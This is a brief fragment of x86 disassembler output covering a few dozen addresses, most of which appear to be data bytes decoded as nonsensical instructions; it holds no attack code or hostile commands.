  433a2e:	add    BYTE PTR [eax],al
  433a30:	add    BYTE PTR [edi+0x0],dl
  433a33:	aaa    
  433a34:	add    BYTE PTR [eax],bh
  433a36:	add    BYTE PTR [edi+0x0],bl
  433a39:	pop    eax
  433a3a:	add    BYTE PTR [edi+0x0],cl
  433a3d:	inc    edi
  433a3e:	add    BYTE PTR [edi+0x0],bl
  433a41:	xor    al,0x0
  433a43:	push   eax
  433a44:	add    BYTE PTR [ecx+0x0],cl
  433a47:	push   ebp
  433a48:	add    BYTE PTR [eax],al
  433a4a:	add    BYTE PTR [edi+0x0],dl
  433a4d:	push   esp
  433a4e:	add    BYTE PTR [ebx+0x0],cl
  433a51:	add    BYTE PTR [eax],al
  433a53:	add    BYTE PTR [edx+0x53],dl
  433a56:	inc    esp
  433a57:	push   ebx
  433a58:	inc    ecx
  433a59:	addr16 (bad) 
  433a5b:	pop    edx
  433a5c:	xchg   ecx,eax
  433a5d:	jecxz  0x433a2d
  433a5f:	inc    edx
  433a60:	mov    ?,WORD PTR [edx-0x52]
  433a63:	jnp    0x433a9d
  433a65:	outs   dx,BYTE PTR ds:[esi]
  433a66:	int3   
  433a67:	mov    edi,0x1b
  433a6c:	push   esp
  433a6d:	cmp    bl,BYTE PTR [ecx+edi*2+0x69]
  433a71:	addr16 push edi
  433a73:	bound  bx,DWORD PTR [edx+0x45]
  433a77:	outs   dx,BYTE PTR ds:[esi]
  433a78:	pop    esp
  433a79:	je     0x433aee
  433a7b:	ja     0x433abe
  433a7d:	imul   edx,DWORD PTR [ecx+esi*2+0x4d],0x63455c61
  433a85:	js     0x433af6
  433a87:	jp     0x433af8
  433a89:	jns    0x433aef
  433a8b:	jp     0x433af5
  433a8d:	je     0x433af3
  433a8f:	jp     0x433af3
  433a91:	cs jo  0x433af8
  433a94:	bound  eax,QWORD PTR [eax]
	...
